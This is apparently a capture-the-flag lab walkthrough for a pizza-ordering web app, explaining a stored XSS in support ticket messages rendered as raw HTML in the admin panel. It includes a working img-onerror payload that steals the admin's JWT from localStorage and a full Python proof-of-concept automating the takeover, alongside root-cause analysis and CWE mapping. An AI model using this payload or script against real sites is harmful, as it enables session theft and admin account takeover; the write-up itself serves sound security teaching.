# cheesy-009 - BugForge Lab Walkthrough

**URL:** https://lab-1785488529074-9ko0js.labs-app.bugforge.io
**Difficulty:** Easy
**Vulnerability:** Stored XSS in support ticket messages, leading to admin session compromise
**Flag:** `bug{JcW4kg97IsbCjancTtRALFtNpliqnrkQ}`

---

## Summary

Cheesy Does It is a pizza-ordering SPA with a customer support ticket system. Ticket messages
submitted by regular users are stored and later rendered, unsanitized, inside the admin panel's
ticket list. An automated admin/support process periodically opens that list, so any HTML/JS
injected into a ticket message executes in the admin's authenticated browser context. That lets a
low-privileged user exfiltrate the admin's JWT and use it against an admin-only endpoint to obtain
the flag.

---

## Tech Stack

- React SPA frontend (Create React App)
- Express.js (Node.js)
- JWT stored in `localStorage` on the client
- SQLite

---

## Key Endpoints

| Endpoint | Method | Auth | Notes |
|----------|--------|------|-------|
| `/api/register` | POST | No | Returns a usable JWT directly |
| `/api/tickets` | GET/POST | JWT | List/create the caller's own support tickets |
| `/api/tickets/:id` | GET | JWT (own) | Ownership enforced - returns `404` for tickets you don't own |
| `/api/tickets/:id/replies` | POST | JWT (own) | Reply to a ticket you own |
| `/api/admin/tickets` | GET | JWT + admin | Lists all tickets across all users - renders `message` field as raw HTML client-side |
| `/api/admin/tickets/:id/replies` | POST | JWT + admin | Admin reply endpoint, used here as the exfil sink |
| `/api/admin/flag` | GET | JWT + admin | Returns the flag |

---

## Discovery

### Step 1 - Map the API surface

The compiled bundle at `/static/js/main.851582bd.js` was greppable for API routes even without
source maps:

```
/api/register /api/login /api/tickets /api/tickets/:id /api/tickets/:id/replies
/api/admin/tickets /api/admin/tickets/:id /api/admin/coupons /api/admin/orders
/api/admin/stats /api/admin/users /api/orders /api/payment/validate /api/payment/process
```

The presence of both a customer-facing `/api/tickets` surface and an admin equivalent
(`/api/admin/tickets`) made the support ticket feature an obvious priority to check first: any
place where user-controlled content is later viewed by a higher-privileged party is a strong IDOR
or stored-XSS candidate.

### Step 2 - Check ticket ownership (ruled out IDOR)

Registered a throwaway account and created one ticket, then tried to fetch tickets belonging to
other (likely seeded) accounts by ID:

```
GET /api/tickets/1  -> {"error":"Ticket not found"}
GET /api/tickets/2  -> {"error":"Ticket not found"}
GET /api/tickets/5  (own ticket) -> full ticket object
```

Ownership is correctly enforced on the read path, so a straightforward IDOR was not the bug here.
That ruled out the most obvious business-logic issue and pointed at how ticket content is
*rendered*, not just who can read it.

### Step 3 - Find the unsanitized render sink

Grepping the bundle for `dangerouslySetInnerHTML` (React's escape hatch for raw HTML injection)
turned up a hit inside what was clearly an admin table row renderer, right next to columns like
`id`, `username`, `subject`, and `status`:

```js
(0, kt.jsx)("div", { dangerouslySetInnerHTML: { __html: e.message } })
```

This is the admin ticket list rendering each ticket's `message` field as raw HTML with no
escaping or sanitization. Any HTML or JavaScript in a ticket's `message` will execute in whatever
browser context loads that admin list.

### Step 4 - Confirm a process actually views the admin ticket list

Support/admin dashboards on this app family are known to be reviewed by an automated internal
process on a polling interval, so the working assumption was that submitting a payload and waiting
would be enough to trigger it, without needing to log in as admin at all.

### Step 5 - Build the exploit

Since ticket IDs are sequential and server-assigned, the ID of a not-yet-created ticket can't be
predicted ahead of time. The fix is to create a "landing pad" ticket first, note its ID, then
create a second ticket whose payload writes back into that landing pad:

```
POST /api/tickets {"subject":"placeholder","message":"placeholder","order_id":null}
-> {"id": 6}
```

Then the payload ticket:

```
POST /api/tickets
{
  "subject": "help please",
  "message": "<img src=x onerror=\"fetch('/api/admin/tickets/6/replies',{method:'POST',headers:{'Content-Type':'application/json','Authorization':'Bearer '+localStorage.getItem('token')},body:JSON.stringify({message:localStorage.getItem('token')})})\">",
  "order_id": null
}
```

`<img src=x onerror=...>` was used instead of a `<script>` tag because `<script>` tags injected via
`innerHTML`/`dangerouslySetInnerHTML` are inert in the DOM and never execute, while event-handler
attributes on elements like `<img>` fire normally.

Whatever process opens `/api/admin/tickets` runs this JavaScript with its own admin session,
including its own JWT in `localStorage`. The payload calls the admin ticket-reply endpoint using
that stolen token, posting the token itself back as a reply on the landing pad ticket, an endpoint
that is reachable specifically because the code executes with admin privileges.

### Step 6 - Recover the token and get the flag

Polling the landing pad ticket:

```
GET /api/tickets/6
-> {"replies": [{"id":2, "message":"eyJhbGciOiJIUzI1NiIs...", "is_staff":1, "username":"admin"}]}
```

The reply `message` field is the admin's raw JWT. Using it directly:

```
GET /api/admin/flag
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...
-> {"flag":"bug{JcW4kg97IsbCjancTtRALFtNpliqnrkQ}"}
```

---

## Proof of Concept

```python
import json, time, urllib.request, urllib.error

BASE = "https://lab-1785488529074-9ko0js.labs-app.bugforge.io"

def req(method, path, data=None, token=None):
    url = BASE + path
    h = {"Content-Type": "application/json"}
    if token:
        h["Authorization"] = f"Bearer {token}"
    body = json.dumps(data).encode() if data is not None else None
    r = urllib.request.Request(url, data=body, headers=h, method=method)
    try:
        with urllib.request.urlopen(r, timeout=10) as resp:
            return resp.status, resp.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()

ts = str(int(time.time()))[-6:]
_, body = req("POST", "/api/register", {
    "username": f"pentest{ts}", "email": f"pentest{ts}@bugforge.io", "password": "Password123!"
})
token = json.loads(body)["token"]

# Landing pad ticket
_, body = req("POST", "/api/tickets",
               {"subject": "placeholder", "message": "placeholder", "order_id": None}, token=token)
land_id = json.loads(body)["id"]

# Payload ticket: fires as the admin process opens /api/admin/tickets
payload = (
    "<img src=x onerror=\"fetch('/api/admin/tickets/%d/replies',"
    "{method:'POST',headers:{'Content-Type':'application/json',"
    "'Authorization':'Bearer '+localStorage.getItem('token')},"
    "body:JSON.stringify({message:localStorage.getItem('token')})})\">" % land_id
)
req("POST", "/api/tickets", {"subject": "help please", "message": payload, "order_id": None}, token=token)

# Poll for the reply containing the stolen admin JWT
admin_token = None
for _ in range(12):
    time.sleep(10)
    _, body = req("GET", f"/api/tickets/{land_id}", token=token)
    ticket = json.loads(body)
    if ticket.get("replies"):
        admin_token = ticket["replies"][0]["message"]
        break

_, flag_body = req("GET", "/api/admin/flag", token=admin_token)
print(flag_body)
# -> {"flag":"bug{JcW4kg97IsbCjancTtRALFtNpliqnrkQ}"}
```

---

## Dead Ends

| Tried | Result | Lesson |
|---|---|---|
| `GET /api/tickets/:id` for other users' ticket IDs | `404 Ticket not found` | Ownership check is solid here, not an IDOR |
| `<script>alert(1)</script>` as the payload | Never executes | Scripts injected via `innerHTML`/`dangerouslySetInnerHTML` are inert; use an event-handler attribute like `<img onerror>` instead |
| Guessing the payload ticket's own ID for the exfil target | Unreliable | Ticket IDs are sequential and assigned server-side after creation; always create a landing pad ticket first and target its known ID |

---

## Root Cause

The admin ticket list view renders each ticket's message with React's raw-HTML escape hatch
instead of treating it as plain text:

```javascript
// Vulnerable pattern (approximate, from the compiled bundle)
function AdminTicketRow({ ticket }) {
  return (
    <tr>
      <td>{ticket.id}</td>
      <td>{ticket.username}</td>
      <td>{ticket.subject}</td>
      <td><div dangerouslySetInnerHTML={{ __html: ticket.message }} /></td>
      <td>{ticket.status}</td>
    </tr>
  );
}
```

Because `message` is fully attacker-controlled (any authenticated customer can set it via
`POST /api/tickets`) and is rendered as raw HTML rather than escaped text, this is a textbook
stored XSS. Combined with an admin JWT sitting in `localStorage`, any customer can turn a support
ticket into a full admin account takeover.

---

## CWE / OWASP

- **CWE-79**: Improper Neutralization of Input During Web Page Generation (Stored Cross-Site Scripting)
- **CWE-1004**: Sensitive Cookie/Token Without Adequate Protection (JWT readable from `localStorage` by injected script)
- **OWASP A03:2021** - Injection
